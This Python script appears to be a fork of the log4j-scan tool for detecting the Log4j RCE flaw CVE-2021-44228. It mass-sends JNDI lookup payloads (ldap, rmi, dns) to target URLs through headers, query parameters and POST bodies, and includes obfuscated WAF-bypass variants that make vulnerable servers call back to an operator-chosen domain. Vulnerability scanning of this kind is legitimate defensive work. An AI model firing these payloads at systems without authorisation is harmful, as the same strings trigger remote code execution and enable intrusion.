#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import binascii
import hashlib
import random
import requests
import time
import sys
import base64
import json
from Crypto.Cipher import AES
from threading import Thread
from queue import Queue


class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            finally:
                self.tasks.task_done()


class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def map(self, func, workload, *args, **kargs):
        for work in workload:
            self.add_task(func, work, *args, **kargs)

    def wait_completion(self):
        self.tasks.join()


class Logger:
    def __init__(self, file):
        self.file = file

    def info(self, msg):
        print("[I] {}".format(msg), file=self.file, flush=True)

    def warn(self, msg):
        print("[W] {}".format(msg), file=self.file, flush=True)

    def error(self, msg):
        print("[E] {}".format(msg), file=self.file, flush=True)

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


print('[%] CVE-2021-44228 - Apache Log4j RCE Scanner')

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    'User-Agent': 'log4j-scan (https://github.com/omicronns/log4j-scan)',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_domain}}/a}",
                       "${${::-j}ndi:rmi://{{callback_domain}}/a}",
                       "${${lower:jndi}:${lower:rmi}://{{callback_domain}}/a}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_domain}}/a}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_domain}}/a}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_domain}}/a}",
                       "${jndi:rmi://{{callback_domain}}}",
                       "${jndi:dns://{{callback_domain}}}"]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--thread-count",
                    dest="thread_count",
                    help="How many threads to use (thread per url) - [Default: 50].",
                    default=50,
                    type=int,
                    action='store')
parser.add_argument("--req-type",
                    dest="req_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--req-timeout",
                    dest="req_timeout",
                    help="Request timeout - [Default: 4].",
                    default=4,
                    type=int,
                    action='store')
parser.add_argument("--retry-wait",
                    dest="retry_wait",
                    help="Wait time after error occurred during fuzzing (in seconds) - [Default: 10].",
                    default=10,
                    type=int,
                    action='store')
parser.add_argument("--retry-count",
                    dest="retry_count",
                    help="How many times to keep retrying after connection error - [Default: 3].",
                    default=3,
                    type=int,
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--callback-domain",
                    dest="callback_domain",
                    help="Callback domain [Default: example.com].",
                    default="example.com",
                    action='store')
parser.add_argument("--out-logs-path",
                    dest="out_logs_path",
                    help="Output logs path directory [Default: .].",
                    default=".",
                    action='store')
parser.add_argument("--parameter-names",
                    dest="parameter_names",
                    help="Comma separated additional parameter names.",
                    action='store')

args = parser.parse_args()

parameter_names = ["username", "user", "email", "email_address", "password"]

if args.parameter_names:
    parameter_names += args.parameter_names.split(",")

def get_fuzzing_headers():
    fuzzing_headers = []
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.append(i)
    return fuzzing_headers


def gen_fuzzing_header(header, payload):
    if args.exclude_user_agent_fuzzing:
        return default_headers["User-Agent"]
    if header == "Referer":
        return f'https://{payload}'
    return payload


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in parameter_names:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_domain, id_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_domain}}", callback_domain)
        new_payload = new_payload.replace("{{random}}", id_string)
        payloads.append(new_payload)
    return payloads


def fuzz_url(url, dns_key):
    sha = hashlib.sha256()
    sha.update(url.encode())
    id_string_raw = sha.digest()
    cipher = AES.new(dns_key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(id_string_raw[:16])
    id_string = binascii.hexlify(ciphertext).decode()
    with open("{}/{}.log".format(args.out_logs_path, id_string), "w") as logfile:
        log = Logger(logfile)
        log.info(f"Testing URL: {url} - {binascii.hexlify(id_string_raw).decode()}/{id_string}")

        proxies = {}
        if args.proxy:
            proxies = {"http": args.proxy, "https": args.proxy}

        payload_callback = "%s.%s" % (id_string, args.callback_domain)
        payload = '${jndi:ldap://%s/%s}' % (payload_callback, id_string)
        payloads = [payload]
        if args.waf_bypass_payloads:
            payloads.extend(generate_waf_bypass_payloads(payload_callback, id_string))

        resp_get = None
        resp_post = None

        try:
            resp_get = requests.request(url=url,
                                        method="GET",
                                        verify=False,
                                        timeout=args.req_timeout,
                                        proxies=proxies)
        except Exception as e:
            log.error(f"EXCEPTION: {e}")
        try:
            resp_post = requests.request(url=url,
                                        method="POST",
                                        verify=False,
                                        timeout=args.req_timeout,
                                        proxies=proxies)
        except Exception as e:
            log.error(f"EXCEPTION: {e}")

        if resp_get is not None:
            log.info(f"GET  URL redirected: {resp_get.url}")
        if resp_post is not None:
            log.info(f"POST URL redirected: {resp_post.url}")

        if resp_get is not None or resp_post is not None:
            for fuzzing_header in get_fuzzing_headers():
                for payload in payloads:
                    log.info(f"URL: {url} | Header: {fuzzing_header} | PAYLOAD: {payload}")
                    retry = True
                    retry_count = args.retry_count
                    while retry and retry_count > 0:
                        retry = False
                        if resp_get is not None and (args.req_type.upper() == "GET" or args.run_all_tests):
                            try:
                                requests.request(url=resp_get.url,
                                                method="GET",
                                                params={name: payload for name in parameter_names},
                                                headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
                                                verify=False,
                                                timeout=args.req_timeout,
                                                proxies=proxies)
                            except Exception as e:
                                retry = True
                                log.error(f"EXCEPTION: {e}")

                        if resp_post is not None and (args.req_type.upper() == "POST" or args.run_all_tests):
                            try:
                                # Post body
                                requests.request(url=resp_post.url,
                                                method="POST",
                                                headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
                                                data=get_fuzzing_post_data(payload),
                                                verify=False,
                                                timeout=args.req_timeout,
                                                proxies=proxies)
                            except Exception as e:
                                retry = True
                                log.error(f"EXCEPTION: {e}")

                            try:
                                # JSON body
                                requests.request(url=resp_post.url,
                                                method="POST",
                                                headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
                                                json=get_fuzzing_post_data(payload),
                                                verify=False,
                                                timeout=args.req_timeout,
                                                proxies=proxies)
                            except Exception as e:
                                retry = True
                                log.error(f"EXCEPTION: {e}")
                        if retry:
                            log.warn("We got an error during fuzzing. Let's wait for some time and retry.")
                            time.sleep(args.retry_wait)
                            retry_count -= 1
                    if retry:
                        log.warn("We got an error during fuzzing. Waiting didn't help. Moving on.")
        log.info("Payloads sent. Fuzzing done.")


def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    print("[%] Checking for Log4j RCE CVE-2021-44228.")
    print(f"[%] Loaded {len(urls)} urls.")

    dns_key = random.randbytes(16)
    print(f"[%] Dns subdomain encryption key: {binascii.hexlify(dns_key).decode()}.")

    pool = ThreadPool(args.thread_count)
    pool.map(fuzz_url, urls, dns_key)
    pool.wait_completion()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
